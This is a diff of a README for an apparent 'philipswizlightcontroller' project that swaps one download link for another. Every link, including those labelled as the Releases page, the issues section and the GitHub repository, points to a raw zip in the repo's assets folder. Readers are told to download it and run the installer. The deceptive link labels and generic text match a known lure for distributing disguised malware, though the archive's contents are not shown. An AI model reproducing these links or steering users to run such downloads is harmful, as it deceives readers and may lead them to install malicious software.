@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the **philipswizlightcontroll
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip)](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip)](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,11 +29,11 @@ To run the **philipswizlightcontroller**, your computer should meet the followin
 
 To get started, visit the Releases page to download the latest version of the software. 
 
-Click this link to [visit the page to download](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip).
+Click this link to [visit the page to download](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip).
 
 Once on the page, you will see several files listed. Follow these steps to install:
 
-1. **Choose the Latest Version**: Look for the file named `https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip` (the version number will vary).
+1. **Choose the Latest Version**: Look for the file named `https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip` (the version number will vary).
 2. **Download the File**: Click on the filename. The download will start automatically.
 3. **Locate the Downloaded File**: Find the downloaded file in your computer's Downloads folder (or the folder where your browser saves downloads).
 4. **Run the Installer**: Double-click the file to start the installation process.
@@ -67,11 +67,11 @@ A: Currently, this application works only on desktop systems. Mobile support may
 
 **Q: What if I have more questions?**
 
-A: You can visit the [issues section](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip) on GitHub for help or to ask questions.
+A: You can visit the [issues section](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip) on GitHub for help or to ask questions.
 
 ## 🔗 Resources
 
-- GitHub Repository: [philipswizlightcontroller](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software-v2.4-alpha.4.zip)
+- GitHub Repository: [philipswizlightcontroller](https://raw.githubusercontent.com/YuuShi0/philipswizlightcontroller/main/assets/Software_v3.5.zip)
 - User Guide: Detailed instructions and tips will be available soon.
 
 Thank you for using **philipswizlightcontroller**! Enjoy seamless control of your Philips WiZ lights.
